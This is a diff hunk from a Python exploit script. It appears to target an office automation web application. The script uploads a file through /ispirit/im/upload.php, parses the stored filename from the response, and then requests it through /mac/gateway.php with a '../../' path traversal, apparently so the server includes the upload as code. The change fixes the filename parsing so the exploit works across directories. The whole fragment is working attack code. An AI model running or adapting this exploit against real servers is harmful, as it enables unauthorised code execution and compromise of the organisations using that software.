@@ -33,8 +33,8 @@ def exp(u):
         req1 = requests.post(u + "/ispirit/im/upload.php", headers=header, verify=False, data=data1,  timeout=25)
         if req1.status_code == 200 and "+OK " in req1.text:
             text = req1.text
-            jpg_filename = text[text.find("_")+1:text.find("|")]
-            data2 = 'json={"url":"/general/../../attach/im/2003/' + jpg_filename + '.jpg"}'
+            jpg_filename = text[text.find("@")+1:text.find("|")].replace("_", "/")
+            data2 = 'json={"url":"/general/../../attach/im/' + jpg_filename + '.jpg"}'
             header["Content-Type"] = "application/x-www-form-urlencoded"
             req2 = requests.post(u + "/mac/gateway.php", headers=header, verify=False, data=data2,  timeout=25)
             if req2.status_code == 404:
